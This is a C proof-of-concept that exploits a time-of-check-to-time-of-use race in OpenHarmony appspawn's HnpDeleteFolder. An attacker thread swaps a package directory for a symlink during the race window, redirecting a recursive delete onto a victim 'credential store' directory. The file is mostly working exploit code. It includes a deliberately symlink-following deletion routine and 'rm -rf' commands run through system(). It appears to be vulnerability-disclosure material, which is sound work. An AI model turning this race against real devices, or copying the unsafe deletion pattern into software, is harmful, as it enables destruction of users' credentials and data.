/*
 * PoC: TOCTOU Race Condition in OpenHarmony appspawn HnpDeleteFolder
 *
 * Demonstrates that between access(path, F_OK) and the actual directory
 * deletion in HnpDeleteFolder, an attacker can replace the target directory
 * with a symlink, redirecting recursive deletion to an arbitrary path.
 *
 * Build: gcc -o poc poc.c -lpthread -O2
 * Run:   ./poc
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/stat.h>
#include <sys/inotify.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>

#define TEST_BASE       "/tmp/hnp_toctou_poc"
#define HNP_PATH        TEST_BASE "/data/hnp/1000/hnp/com.example.pkg"
#define VICTIM_DIR      TEST_BASE "/victim_credential_store"
#define VICTIM_FILE     VICTIM_DIR "/device_auth.key"

/* Simulated race window delay (microseconds) to mimic kernel scheduling */
#define RACE_DELAY_US   500

static volatile int g_race_won = 0;
static volatile int g_ready = 0;

/* --- Simulated vulnerable HnpDeleteFolder (mirrors hnp_file.c:178) --- */
static int HnpDeleteFolder(const char *path)
{
    /* CHECK: original code does access(path, F_OK) before this function */
    DIR *dir = opendir(path);
    if (dir == NULL) {
        /* If it's now a symlink to a dir, opendir follows it */
        if (errno == ENOTDIR) {
            /* In real code this would fail, but symlink to dir succeeds */
            return -1;
        }
        return -1;
    }

    struct dirent *entry;
    char filepath[PATH_MAX];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(filepath, sizeof(filepath), "%s/%s", path, entry->d_name);

        struct stat st;
        /* lstat would be safe; stat follows symlinks (vulnerable pattern) */
        if (stat(filepath, &st) != 0)
            continue;

        if (S_ISDIR(st.st_mode)) {
            HnpDeleteFolder(filepath);
        } else {
            unlink(filepath);
        }
    }
    closedir(dir);
    rmdir(path);
    return 0;
}

/* --- Simulated vulnerable HnpUnInstall (mirrors hnp_installer.c:422) --- */
static int HnpUnInstall(const char *packagePath)
{
    /* CHECK phase: verify path exists */
    if (access(packagePath, F_OK) != 0) {
        printf("[appspawn] access() check failed: path does not exist\n");
        return -1;
    }

    printf("[appspawn] access() check passed, path exists\n");

    /*
     * RACE WINDOW: In production, additional processing happens here
     * (reading package info, logging, etc.) giving the attacker time.
     * We signal readiness and wait for the attacker to complete the swap.
     */
    __atomic_store_n(&g_ready, 1, __ATOMIC_RELEASE);

    /* Simulate the processing time that exists in the real code path
     * (package info parsing, hnp config reads, etc.) */
    while (!__atomic_load_n(&g_race_won, __ATOMIC_ACQUIRE))
        usleep(50);
    usleep(100); /* Let symlink settle */

    /* USE phase: delete the folder (now potentially a symlink) */
    printf("[appspawn] Calling HnpDeleteFolder(\"%s\")\n", packagePath);
    int ret = HnpDeleteFolder(packagePath);

    return ret;
}

/* --- Attacker thread: monitors and exploits the race --- */
static void *attacker_thread(void *arg)
{
    (void)arg;

    /* Spin-wait until the victim process signals the race window is open.
     * In a real attack, this would use inotify on the parent dir to detect
     * the access() syscall on the HNP path. */
    while (!__atomic_load_n(&g_ready, __ATOMIC_ACQUIRE))
        usleep(10);

    printf("[attacker] Race window detected! Replacing directory with symlink\n");

    /*
     * EXPLOIT: Remove the legitimate directory and replace with symlink.
     * This is the core of the TOCTOU attack.
     */

    /* Remove the original directory (it's empty or we can rename it) */
    /* Use rename for atomicity - rename to a temp name, then symlink */
    char tmp_path[PATH_MAX];
    snprintf(tmp_path, sizeof(tmp_path), "%s.bak", HNP_PATH);

    if (rename(HNP_PATH, tmp_path) == 0) {
        /* Create symlink pointing to victim directory */
        if (symlink(VICTIM_DIR, HNP_PATH) == 0) {
            printf("[attacker] Symlink created: %s -> %s\n", HNP_PATH, VICTIM_DIR);
            g_race_won = 1;
        } else {
            perror("[attacker] symlink failed");
            rename(tmp_path, HNP_PATH);
        }
    } else {
        perror("[attacker] rename failed");
    }

    return NULL;
}

/* --- Setup test environment --- */
static void setup_environment(void)
{
    char cmd[512];

    /* Clean previous run */
    snprintf(cmd, sizeof(cmd), "rm -rf %s", TEST_BASE);
    system(cmd);

    /* Create HNP package directory (simulating installed package) */
    snprintf(cmd, sizeof(cmd), "mkdir -p %s", HNP_PATH);
    system(cmd);

    /* Put a marker file in the HNP dir so it's non-empty */
    snprintf(cmd, sizeof(cmd), "touch %s/lib.so", HNP_PATH);
    system(cmd);

    /* Create victim directory with sensitive files */
    snprintf(cmd, sizeof(cmd), "mkdir -p %s", VICTIM_DIR);
    system(cmd);

    snprintf(cmd, sizeof(cmd),
             "echo 'SENSITIVE_DEVICE_AUTH_KEY_DATA' > %s", VICTIM_FILE);
    system(cmd);

    /* Create additional victim files */
    snprintf(cmd, sizeof(cmd),
             "echo 'trusted_root_cert' > %s/root_ca.pem", VICTIM_DIR);
    system(cmd);
}

/* --- Verify results --- */
static int verify_results(void)
{
    int victim_destroyed = 0;

    printf("\n=== Results ===\n");

    if (g_race_won) {
        printf("[+] Race condition exploited successfully\n");
        printf("[+] Symlink replacement completed during TOCTOU window\n");
    } else {
        printf("[-] Race was not won this attempt (timing-dependent)\n");
    }

    /* Check if victim files were deleted */
    if (access(VICTIM_FILE, F_OK) != 0) {
        printf("[+] VICTIM FILE DELETED: %s\n", VICTIM_FILE);
        victim_destroyed = 1;
    } else {
        printf("[ ] Victim file still exists (race timing issue)\n");
    }

    struct stat st;
    if (stat(VICTIM_DIR, &st) != 0) {
        printf("[+] VICTIM DIRECTORY DESTROYED: %s\n", VICTIM_DIR);
        victim_destroyed = 1;
    } else if (!S_ISDIR(st.st_mode)) {
        printf("[+] Victim directory is no longer a directory\n");
        victim_destroyed = 1;
    }

    if (victim_destroyed) {
        printf("\n[VULNERABLE] The TOCTOU race in HnpDeleteFolder allows\n");
        printf("             arbitrary directory deletion via symlink replacement.\n");
        printf("             Impact: Deletion of credential stores, system configs,\n");
        printf("             or other app data accessible to the uid.\n");
    }

    return victim_destroyed ? 0 : 1;
}

int main(void)
{
    printf("=== OpenHarmony appspawn HNP TOCTOU PoC ===\n");
    printf("Target: HnpDeleteFolder race condition (hnp_file.c:178)\n");
    printf("Vector: Symlink replacement between access() and opendir()\n\n");

    setup_environment();

    printf("[*] Test environment created:\n");
    printf("    HNP path (will be replaced): %s\n", HNP_PATH);
    printf("    Victim directory:            %s\n\n", VICTIM_DIR);

    /* Verify setup */
    printf("[*] Before attack:\n");
    printf("    HNP dir exists: %s\n",
           access(HNP_PATH, F_OK) == 0 ? "YES" : "NO");
    printf("    Victim file exists: %s\n\n",
           access(VICTIM_FILE, F_OK) == 0 ? "YES" : "NO");

    /* Launch attacker thread */
    pthread_t attacker;
    if (pthread_create(&attacker, NULL, attacker_thread, NULL) != 0) {
        perror("pthread_create");
        return 1;
    }

    /* Small delay to let attacker set up inotify watch */
    usleep(1000);

    /* Trigger the vulnerable uninstall flow */
    printf("[appspawn] Starting HNP uninstall for com.example.pkg...\n");
    HnpUnInstall(HNP_PATH);

    /* Wait for attacker to finish */
    pthread_join(attacker, NULL);

    /* Show results */
    int ret = verify_results();

    /* Cleanup */
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "rm -rf %s", TEST_BASE);
    system(cmd);

    return ret;
}
